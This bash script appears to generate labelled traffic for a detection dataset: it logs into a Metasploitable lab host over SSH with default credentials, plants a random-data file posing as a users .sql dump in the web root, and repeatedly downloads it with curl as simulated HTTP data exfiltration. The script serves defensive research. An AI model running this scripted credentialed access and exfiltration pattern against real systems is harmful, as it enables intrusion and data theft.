#!/usr/bin/env bash
set -euo pipefail

RUN_NAME="$1"
NOTES_FILE="$2"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../config.sh"

TARGET_IP="${VICTIM_IP:-192.168.9.131}"
TARGET_USER="${TARGET_USER:-msfadmin}"
TARGET_PASS="${TARGET_PASS:-msfadmin}"

ATTACK_CATEGORY="data_exfiltration"
ATTACK_SUBTYPE="http"
PROFILE_ID="${PROFILE_ID:-http_exfil_medium_repeat}"

ATTACK_DURATION=300
PRE_IDLE=9
POST_IDLE=9

SEED="${SEED:-$RANDOM}"
RANDOM="$SEED"

PROTOCOL="http"
TOOL="curl"

WEB_DIR="${WEB_DIR:-/var/www}"

export SSHPASS="$TARGET_PASS"

SSH_OPTS=(
  -o StrictHostKeyChecking=no
  -o UserKnownHostsFile=/dev/null
  -o LogLevel=ERROR
  -o HostKeyAlgorithms=+ssh-rsa,ssh-dss
  -o ConnectTimeout=8
)

rand_int() {
  local min="$1"
  local max="$2"
  echo $(( RANDOM % (max - min + 1) + min ))
}

log_kv() {
  echo "$1=$2" | tee -a "$NOTES_FILE"
}

log_time() {
  echo "$1 $(date -u +'%Y-%m-%d %H:%M:%S UTC')" | tee -a "$NOTES_FILE"
}

configure_profile() {
  case "$PROFILE_ID" in
    http_exfil_small_slow)
      FILE_SIZE_MB=3
      SLEEP_MIN=10
      SLEEP_MAX=20
      REMOTE_BASENAME="users_small_${RUN_NAME}.sql"
      MODULE_SUMMARY="http_exfil_small_slow"
      ;;
    http_exfil_medium_repeat)
      FILE_SIZE_MB=20
      SLEEP_MIN=4
      SLEEP_MAX=8
      REMOTE_BASENAME="users_medium_${RUN_NAME}.sql"
      MODULE_SUMMARY="http_exfil_medium_repeat"
      ;;
    http_exfil_large_burst)
      FILE_SIZE_MB=80
      SLEEP_MIN=1
      SLEEP_MAX=3
      REMOTE_BASENAME="users_large_${RUN_NAME}.sql"
      MODULE_SUMMARY="http_exfil_large_burst"
      ;;
    *)
      echo "[-] Unknown PROFILE_ID: $PROFILE_ID" >&2
      echo "    Allowed: http_exfil_small_slow, http_exfil_medium_repeat, http_exfil_large_burst" >&2
      exit 1
      ;;
  esac
}

configure_profile

REMOTE_FILE="${WEB_DIR}/${REMOTE_BASENAME}"
HTTP_URL="http://${TARGET_IP}/${REMOTE_BASENAME}"
DEBUG_LOG="/tmp/exfil_http_debug_${RUN_NAME}.log"
: > "$DEBUG_LOG"

log_kv RUN_ID "$RUN_NAME"
log_kv ATTACK_CATEGORY "$ATTACK_CATEGORY"
log_kv ATTACK_SUBTYPE "$ATTACK_SUBTYPE"
log_kv PROFILE_ID "$PROFILE_ID"
log_kv RANDOM_SEED "$SEED"
log_kv PROTOCOL "$PROTOCOL"
log_kv TOOL "$TOOL"
log_kv FILE_SIZE_MB "$FILE_SIZE_MB"
log_kv SLEEP_MIN "$SLEEP_MIN"
log_kv SLEEP_MAX "$SLEEP_MAX"
log_kv ATTACK_DURATION "$ATTACK_DURATION"
log_kv PRE_IDLE "$PRE_IDLE"
log_kv POST_IDLE "$POST_IDLE"
log_kv WEB_DIR "$WEB_DIR"
log_kv REMOTE_FILE "$REMOTE_FILE"
log_kv REMOTE_BASENAME "$REMOTE_BASENAME"
log_kv MODULE_SUMMARY "$MODULE_SUMMARY"

echo "[*] HTTP data exfiltration started: run=$RUN_NAME profile=$PROFILE_ID seed=$SEED" | tee -a "$DEBUG_LOG"

echo "[PREP] removing old remote file if exists: $REMOTE_FILE" >> "$DEBUG_LOG"
sshpass -e ssh -T "${SSH_OPTS[@]}" "$TARGET_USER@$TARGET_IP" \
  "echo '$TARGET_PASS' | sudo -S rm -f '$REMOTE_FILE'" >> "$DEBUG_LOG" 2>&1 || true

echo "[PREP] creating remote web file: $REMOTE_FILE size=${FILE_SIZE_MB}MB" >> "$DEBUG_LOG"
sshpass -e ssh -T "${SSH_OPTS[@]}" "$TARGET_USER@$TARGET_IP" \
  "echo '$TARGET_PASS' | sudo -S dd if=/dev/urandom of='$REMOTE_FILE' bs=1M count='$FILE_SIZE_MB' && echo '$TARGET_PASS' | sudo -S chmod 644 '$REMOTE_FILE' && ls -lh '$REMOTE_FILE'" \
  >> "$DEBUG_LOG" 2>&1

echo "[CHECK] checking remote web file exists and is non-empty" >> "$DEBUG_LOG"
sshpass -e ssh -T "${SSH_OPTS[@]}" "$TARGET_USER@$TARGET_IP" \
  "test -s '$REMOTE_FILE' && ls -lh '$REMOTE_FILE'" \
  >> "$DEBUG_LOG" 2>&1

echo "[CHECK] testing HTTP HEAD before ATTACK_START: $HTTP_URL" >> "$DEBUG_LOG"
curl -f -sS -I --max-time 30 "$HTTP_URL" >> "$DEBUG_LOG" 2>&1
echo "[CHECK] HTTP HEAD succeeded: $REMOTE_BASENAME" >> "$DEBUG_LOG"

curl -f -sS -I --max-time 30 "$HTTP_URL" >> "$DEBUG_LOG" 2>&1
echo "[CHECK] HTTP HEAD succeeded: $REMOTE_BASENAME" >> "$DEBUG_LOG"

sleep "$PRE_IDLE"
log_time ATTACK_START

# Boundary guard:
# Avoid the first large transfer falling into the aggregation window
# that contains ATTACK_START. Window size is usually 3s, so 4s is safer.
BOUNDARY_GUARD=4
echo "[GUARD] sleeping ${BOUNDARY_GUARD}s after ATTACK_START before first transfer" >> "$DEBUG_LOG"
sleep "$BOUNDARY_GUARD"

START_TIME=$SECONDS
ITER=0

while [[ $((SECONDS - START_TIME)) -lt "$ATTACK_DURATION" ]]; do
  ITER=$((ITER + 1))
  NOW_TS="$(date -u +'%Y-%m-%d %H:%M:%S UTC')"

  echo "[EXFIL][HTTP][$ITER] $NOW_TS downloading $REMOTE_BASENAME" >> "$DEBUG_LOG"

  curl -f -sS --max-time 120 -o /dev/null "$HTTP_URL" >> "$DEBUG_LOG" 2>&1

  echo "[EXFIL][HTTP][$ITER] done" >> "$DEBUG_LOG"

  SLEEP_SEC="$(rand_int "$SLEEP_MIN" "$SLEEP_MAX")"
  echo "[EXFIL][HTTP][$ITER] sleep ${SLEEP_SEC}s" >> "$DEBUG_LOG"
  sleep "$SLEEP_SEC"
done

log_time ATTACK_END

echo "[CLEANUP] removing remote file: $REMOTE_FILE" >> "$DEBUG_LOG"
sshpass -e ssh -T "${SSH_OPTS[@]}" "$TARGET_USER@$TARGET_IP" \
  "echo '$TARGET_PASS' | sudo -S rm -f '$REMOTE_FILE'" >> "$DEBUG_LOG" 2>&1 || true

sleep "$POST_IDLE"

echo "[+] HTTP data exfiltration finished: run=$RUN_NAME profile=$PROFILE_ID iterations=$ITER" | tee -a "$DEBUG_LOG"
